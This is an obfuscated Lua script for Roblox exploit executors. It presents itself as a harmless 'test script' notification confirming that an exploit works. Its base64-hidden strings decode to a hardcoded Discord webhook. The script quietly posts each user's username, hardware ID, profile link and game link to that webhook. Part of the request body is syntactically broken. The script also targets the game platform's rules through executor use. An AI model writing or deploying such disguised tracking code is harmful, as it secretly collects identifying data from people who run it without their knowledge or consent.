--[[
Developed by fedarel
]]
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local HttpService = game:GetService(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('uQZpWgThxOldMBmgKoPrzaoPgRFQZhscGuPPnXqACZeWIIiKNTxAHHrSHR0cFNlcnZpY2U='))
local Webhook_URL = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('nBMMvUIFOBFqFdJnaUeviuSVeGdFRSybHsEcTqFLyabYVCfMZrvXjYMaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxNDY5MjkzOTgwOTI5MjM3OC9Lc2QyaGhpeUUtUEJLNjF1ZmJFLXkyRjlHem5lcTN1RTZ3cHZfOTdFb1dqMGVacXRDeXkzaVpyNmhodUZGVXNVWVNVUA==')

local function formatTime()
    local time = os.time()
    local offset = -5 
    local estTime = os.date(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('bStNdlPdGJROhzfUNfUOEqKHKoXFoWtOhiKHlSaCEsvmPczSHgEGclFISVZLSVtLSVkICVIOiVNOiVT'), time + offset * 3600)
    return estTime .. NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('OgCeDzpcShkfJJCcEOUzVjByRjpydeHGqriWaMjPsdBWPnZBQPKyIwyIEVTVA==')
end

local function getRobloxProfileLink()
    local player = game.Players.LocalPlayer
    return NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('NiAXGWozydQsRgNhMxxddUBvgiRxpjPwdobWUgHMTIMVuCSqkjeLnDRW0xpbmsgdG8gdGhlaXIgUm9ibG94IHByb2ZpbGU6XShodHRwczovL3d3dy5yb2Jsb3guY29tL3VzZXJzLw==') .. player.UserId .. NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('nUcBcsOdRIsrXVLqOTEqZKUeEmYGKstlPccufagKsPDUDUOwwnUPPhBL3Byb2ZpbGUp')
end

local function getGameLink()
    return NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('vjbDhfInnhEncyiYsVngFXiuCdkGsTHGheKLhBdZhWZXWnrCWgVqZFyW0xpbmsgdG8gdGhlIGdhbWUgdGhleSBleGVjdXRlZCB0aGUgc2NyaXB0IGluOl0oaHR0cHM6Ly93d3cucm9ibG94LmNvbS9nYW1lcy8=') .. game.PlaceId .. NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('jvfdMfSNbHCWoXFvoPUiJqUokIFHVAjKbDcwuOVPmvqMBiHLuzqbXKyKQ==')
end

local username = game.Players.LocalPlayer.Name

local function getCurrentDate()
    local utc_time = os.time()
    local est_offset = -5 * 3600
    local est_time = utc_time + est_offset
    local est_formatted_date = os.date(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('cdOubQCTpffJTouWSyGgitxpgBdnRMvIQBcEYFTylpHdzmMwtCuHbxiJVktJW0tJWQ='), est_time)
    local utc_formatted_date = os.date(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('tRqfYUFARapdjVvrDxYoMJmJyzJyQtNhOCBXIjafyYlZXpOftLChdVgJVktJW0tJWQ='), utc_time)
    return utc_formatted_date, est_formatted_date
end

local utc_date, est_date = getCurrentDate()

local text = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('NUlwUSrAtJqvwwRLiJRqocPfreGABCmHefeZeEpHujVgBQummICyVtWTWFjU3Bsb2l0IGlzIGN1cnJlbnRseSB3b3JraW5nIG9uIA==') .. est_date

local PromptFunction = Instance.new(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('zmwYrfgtsPkLkYWOuHGdNiSRaPUOpdrvczOHrJqMunwPaJYvzRHQGSqQmluZGFibGVGdW5jdGlvbg=='))

PromptFunction.OnInvoke = function(response)
    if response == NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('GyHdxXtlikerAoKaSIrqKpdAFkDVgmFcMGtjqsSWvwIbwYSJZEngLrYQ29udGludWU=') then
        print(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('rjnVjzmPmMJAmpRJaGMsGWcSHFyCYthQYYLkWbMCLkjMrnnPgjOPPiwQ29udGludWluZy4uLg=='))
    else
        print(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('VTjWOUDOiCuOtTJTjeysndEEBAyLZAVMNSntAPQJrhWZMKJXOYlrDePTm90aWZpY2F0aW9uIGRpc21pc3NlZC4='))
    end
end

print(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('RnyExqdHFnUtaQKlpRlRfBkFxCbCmOKazqquhiNtHavPtIzbmvnobQDRGV2ZWxvcGVkIGJ5IGZlZGFyZWwsIGZvciBNYWNzcGxvaXQ='))

game.StarterGui:SetCore(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('bAHwXvYgzwscvfFNrZnsDoxgdBkIJxflrZyowHIgJjbXDvfQaTbeuepU2VuZE5vdGlmaWNhdGlvbg=='), {
    Title = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('aAISfYywrPSyoOetpVYETIHqylBeIaNujfkSFJZMthjLKrUeMhLEuncVGVzdCBTY3JpcHQgUHJvbXB0'),
    Text = text,
    Button1 = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('pDasjaarfPkGTmAsJPiRObUcRCAmcUrrGrscCJvnjvAHEOzGnmCcxCbQ29udGludWU='),
    Duration = math.huge,
    Icon = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('ZURHWVDTWLpTPioyUqbgPsjTyaKHhWpGLGnViSoUNQDGghOYZPbczKLcmJ4YXNzZXRpZDovLzYyMzg1MzcyNDA='),
    Callback = PromptFunction
})

local response = syn.request({
    Url = Webhook_URL,
    Method = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('JgYJSgZQabHjvqGxCTtXTOGdokqZZSoHoFqdBMHHnAUyjbgXRarrOgaUE9TVA=='),
    Headers = {
        [NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('BnzpOCDktjWsiwzuWwWwyGVMVZwPXAHKceLLbygXtNeKDLwZHAtsJteQ29udGVudC1UeXBl')] = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('NSJiDoXpcFKGaxXHyWudYKuhqpCrfuuMzTqOclGiKoMBcdIBIbxBISxYXBwbGljYXRpb24vanNvbg==')
    },
    Body = HttpService:JSONEncode({
        [NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('RraOmFATGWIDxyecSRzxXKnrezrrxeOzzYRpihqghjrtetRcuULOdQEY29udGVudA==')] = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('oXVvdFcLwCnCkFBBoEtJrROQWNdISFVbQEktYbIPbYkvkTsmVLfKGql'),
        [NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('LokmldTWFoQJeBRCcTUEiHEFygagsqVkgJyvwMMEjSkOAZhtlqJQRbRZW1iZWRz')] = {{
            [NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('FbPBlInhaqmAeIQNmwUvMGqpsPYUnomauJYdildKYJsUHxENHTvllyVdGl0bGU=')] = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('VxhxiviZCvMqMKldhGEukUshyFAeOdunyUuMzkALdnLqdVKAklvmpFzKipTY3JpcHQgRXhlY3V0aW9uIERldGVjdGVkKio='),
            [NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('PXXEDoKAEIMohHzmMpCxlEhXEZAgqJtJAbZEuYihwbTizJwyWJtMRObZGVzY3JpcHRpb24=')] = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('GDvaOmPUWZWTsEBeQTZikxmbnJWIrZCrklbgzEHvIJcNXcmcnfcTHuhKipc')NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('aNmsewjNCLSkOkfFqRzBGzcYkWApMNchzAyFzQQSGtgekyGXEiFuXWXIC4uIHVzZXJuYW1lIC4uIA==')\NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('lpFZjAcJEjGuyZdNnGQZNRZevlgIyGmsZqwHRHxeRujIiLUcELsyUUiKiogaGFzIGV4ZWN1dGVkIHRoZSBzY3JpcHQuXG5cblRpbWUgc2NyaXB0IHdhcyBleGVjdXRlZDogKA==') .. formatTime() .. NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('XgMMuNZkakTfCdfKhjEkDfjsUfTmnRZuiqRccGUcjFLUetbfWclpJOOKVxuXG5IYXJkd2FyZSBJRDog') .. game:GetService(NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('ahxwkEQmIFQQVbXFVHaRMeilhuXgpTmGagDiAwSOrGaaoPVBWERCQqYUmJ4QW5hbHl0aWNzU2VydmljZQ==')):GetClientId() .. NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('yustXzGsnjpMhpPOXRmlQpldJpoiywUbQpfuzQhjcAMCfVJFmXkHXHhXG5cbg==') .. getRobloxProfileLink() .. NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('EYzvOPohjaHbVFUEevhJrYCunyZMTzikAsxiKNVQqtyUKbQIoXeHHnIXG5cbg==') .. getGameLink(),
            [NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('fdGBzNZlYlgAaHCssmShTDKzjvcCFaRpftnvfBGcNGpPPIYhZxuAPkIdHlwZQ==')] = NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('ADBaaXAnnaqecPQYQtJTuhidJPXGSlrlXicqLlzRIyIkUKORjTTVxDecmljaA=='),
            [NQvUdKIaajUqsUDhfpmuhfKiLhIQtelWzMJZlPIukDeCKUpWjQDFibIPKtLcMxMNkbSsjNeXFMZoGyNZZqtxdWVzmrXA('lalJhJUpkZcVRjPxBFCrHkmdvYWfzdonJfUBbQoTrHLGOzHbjEAuFuWY29sb3I=')] = tonumber(0x7F00FF) 
        }}
    })
})
    
